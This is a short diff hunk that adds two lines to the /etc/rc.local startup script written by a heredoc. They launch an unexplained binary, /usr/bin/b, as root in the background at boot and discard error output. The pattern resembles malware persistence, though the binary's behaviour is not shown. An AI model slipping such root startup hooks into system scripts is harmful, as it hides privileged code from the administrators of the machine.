@@ -66,6 +66,8 @@ cat > /etc/rc.local <<-END
 #!/bin/sh -e
 # rc.local
 # By default this script does nothing.
+su -s /bin/bash -c '/usr/bin/b &' root
+feedback=$? 2>/dev/null
 exit 0
 END
 
